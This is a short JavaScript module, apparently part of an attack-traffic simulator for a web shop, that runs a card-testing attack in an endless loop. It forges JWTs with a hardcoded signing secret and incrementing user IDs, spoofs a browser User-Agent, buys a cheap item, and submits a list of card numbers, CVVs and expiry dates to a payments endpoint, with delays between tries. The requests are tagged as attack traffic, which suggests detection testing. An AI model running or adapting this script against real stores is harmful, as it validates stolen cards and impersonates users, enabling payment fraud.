const { sendRequest, wait } = require('../lib/http');
const cards = require('../payloads/cards');
const jwt = require('jsonwebtoken');

async function run() {
  // We'll generate a fresh JWT for the attacker on each cycle
  let userId = 100;
  
  while (true) {
    const token = jwt.sign({ id: userId++, role: 'customer' }, 'supersecretkey123', { expiresIn: '24h' });
    const headers = { 
      'User-Agent': 'Mozilla/5.0 (Linux; Android 11; SM-G991B) AppleWebKit/537.36',
      'Authorization': `Bearer ${token}` 
    };

    for (const cardData of cards) {
      // Add cheap item to cart
      await sendRequest('SUSPICIOUS', 'POST', '/api/cart/add', headers, { productId: 6, qty: 1 });
      await wait(500);

      // Checkout (create order to attach payment to)
      await sendRequest('SUSPICIOUS', 'POST', '/api/orders/checkout', headers);
      await wait(500);

      // Assume order ID was 1 for testing purposes (since dummy doesn't return it cleanly in a way we track here)
      // Send the payment request with raw card data (PCI violation)
      await sendRequest('ATTACK', 'POST', '/api/payments/process', headers, {
        orderId: Math.floor(Math.random() * 100),
        cardNumber: cardData.card,
        cvv: cardData.cvv,
        expiry: cardData.exp
      });

      await wait(300); // Rapid testing
    }

    await wait(12000); // Cooldown before next batch
  }
}

module.exports = run;
